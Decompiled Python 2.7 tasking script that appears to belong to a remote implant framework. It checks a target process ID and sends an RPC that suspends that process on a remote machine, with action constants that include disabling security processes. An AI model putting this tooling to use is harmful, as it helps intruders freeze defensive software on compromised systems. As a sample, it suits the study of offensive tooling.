# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_ProcessSuspend_Tasking.py
CMD_ACTION_STATUS = 1
CMD_ACTION_ON = 2
CMD_ACTION_OFF = 3
CMD_ACTION_DISABLE_ALL = 4
CMD_ACTION_DISABLE_SECURITY = 5
CMD_ACTION_ENABLE_ALL = 6
CMD_ACTION_ENABLE_SECURITY = 7

def TaskingMain(namespace):
    import mcl.imports
    import mcl.object.XmlOutput
    import mcl.target
    import mcl.tasking
    import mcl.tasking.technique
    import mcl.tasking.env
    import time
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.process.cmd.processsuspend', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.process.cmd.processsuspend.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    rpc = mca.process.cmd.processsuspend.tasking.RPC_INFO_ACTION
    tgtParams = mca.process.cmd.processsuspend.Params()
    xml = mcl.object.XmlOutput.XmlOutput()
    xml.Start('TargetProcess')
    xml.AddAttribute('id', '%d' % lpParams['pid'])
    mcl.tasking.OutputXml(xml)
    tgtParams.pid = lpParams['pid']
    tgtParams.force = lpParams['force']
    if tgtParams.pid <= 0:
        mcl.tasking.OutputError('Invalid PID (%u)' % lpParams['pid'])
        return False
    tgtpid = int(mcl.tasking.env.GetValue('_PID', True))
    if tgtpid == tgtParams.pid:
        mcl.tasking.OutputError('\n    Unable to freeze your own process')
        return False
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.process.cmd.processsuspend.errorStrings)
        return False
    return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)